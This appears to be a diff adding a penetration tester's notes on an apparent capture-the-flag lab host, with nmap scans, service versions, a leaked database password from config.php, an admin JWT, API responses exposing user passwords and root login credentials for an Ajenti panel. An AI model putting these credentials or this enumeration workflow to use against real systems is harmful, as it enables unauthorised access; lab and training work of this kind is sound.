@@ -1,0 +1,172 @@
+    
+TYPICAL TCP PORT SCAN
+{
+root@kali:~# nmap victim
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-24 16:16 EDT
+Nmap scan report for victim (10.10.10.137)
+Host is up (0.034s latency).
+Not shown: 995 closed ports
+PORT     STATE SERVICE
+21/tcp   open  ftp
+22/tcp   open  ssh
+80/tcp   open  http
+3000/tcp open  ppp
+8000/tcp open  http-alt
+
+Nmap done: 1 IP address (1 host up) scanned in 7.10 seconds
+root@kali:~# 
+
+}//end TYPICAL TCP PORTSCAN
+
+SERVICE SCAN ON PORT 21 (ftp)
+{
+root@kali:~# nmap -sV -p 21 victim
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-24 16:18 EDT
+Nmap scan report for victim (10.10.10.137)
+Host is up (0.034s latency).
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3+ (ext.1)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 0.88 seconds
+}//end SERVICE SCAN ON PORT 21
+
+FULL PORT SERVICE SCANnet
+{
+PORT     STATE SERVICE  VERSION
+21/tcp   open  ftp      vsftpd 3.0.3+ (ext.1)
+22/tcp   open  ssh?
+80/tcp   open  http     Apache httpd 2.4.38 ((FreeBSD) PHP/7.3.3)
+3000/tcp open  http     Node.js Express framework
+8000/tcp open  http-alt
+}//end FULL PORT SERVICE SCAN
+
+BOOTSTRAP VERSION #
+{
+Bootstrap v4.2.1 (https://getbootstrap.com/)victim.com/vendor/boostrap
+
+ALSO RUNNING VERSION 
+Bootstrap v3.3.7 (http://getbootstrap.com) victim.com/css
+	THERE IS A POSSIBLE VUNERABILITY HERE
+	https://snyk.io/test/npm/bootstrap/3.3.7 
+}//end bootstrap version #
+
+POSSIBLY IMPORTANT MAYBE DB PASS
+{
+FOUND IN 10.10.10.137/config.php
+$dbHost = 'localhost'; $dbUsername = 'root'; $dbPassword = 'Zk6heYCyv6ZE9Xcg'; $db = "login"; $conn = new mysqli($dbHost, $dbUsername, $dbPassword,$db) or die("Connect failed: %s\n". $conn -> error);
+}//END POTENTIALLY IMPORT DB PASS
+AUTH TOKEN
+{
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTY0MDgxMjA1LCJleHAiOjE1NjQxNjc2MDV9.vOX08KXlkzYN__Kw6phyMiw4x6DhmLcNCKLe4Gvkrj8
+}//END AUTH TOKEN
+
+victim.com:3000/users
+{
+	
+0	
+ID	"1"
+name	"Admin"
+Role	"Superuser"
+1	
+ID	"2"
+name	"Derry"
+Role	"Web Admin"
+2	
+ID	"3"
+name	"Yuri"
+Role	"Beta Tester"
+3	
+ID	"4"
+name	"Dory"
+Role	"Supporter"
+}//END USERS
+
+POSSIBLE PASS in victim.com:3000/users/admin
+{
+HTTP/1.1 200 OK
+
+X-Powered-By: Express
+
+Content-Type: application/json; charset=utf-8
+
+Content-Length: 45
+
+ETag: W/"2d-6LfOUjcs63Zey9NM+wGG+B6F0ts"
+
+Date: Thu, 25 Jul 2019 19:10:59 GMT
+
+Connection: close
+
+
+
+{"name":"Admin","password":"WX5b7)>/rp$U)FW"}
+
+}//END ADMIN
+
+VICTIM.COM:3000/USERS/DERRY
+{
+HTTP/1.1 200 OK
+
+X-Powered-By: Express
+
+Content-Type: application/json; charset=utf-8
+
+Content-Length: 46
+
+ETag: W/"2e-sgpTWo5Mzwc9YEHFtNldZwP3qII"
+
+Date: Thu, 25 Jul 2019 19:15:18 GMT
+
+Connection: close
+
+{"name":"Derry","password": "rZ86wwLvx7jUxtch"}
+}//END DERRY
+
+VICTIM.COM:3000/USERS/DORY
+{
+HTTP/1.1 200 OK
+
+X-Powered-By: Express
+
+Content-Type: application/json; charset=utf-8
+
+Content-Length: 44
+
+ETag: W/"2c-QVJ354QI7/P9wWVh97w4YNw3O+g"
+
+Date: Thu, 25 Jul 2019 19:17:59 GMT
+
+Connection: close
+
+{"name":"Dory","password":" D "}
+}//end DORY
+
+
+VICTIM.COM:3000/users/Yuri
+{
+HTTP/1.1 200 OK
+
+X-Powered-By: Express
+
+Content-Type: application/json; charset=utf-8
+
+Content-Length: 41
+
+ETag: W/"29-mSBdfTKaglwQWJ9faJ1HRSb6D30"
+
+Date: Thu, 25 Jul 2019 19:18:41 GMT
+
+Connection: close
+
+{"name":"Yuri","password":"bet@tester87"}
+}//end YURI
+
+CONFIRMED AJENTI LOGIN CREDS AJENTI PASS
+{
+USER: root
+PASS: KpMasng6S5EtTy9Z
+}
+
+
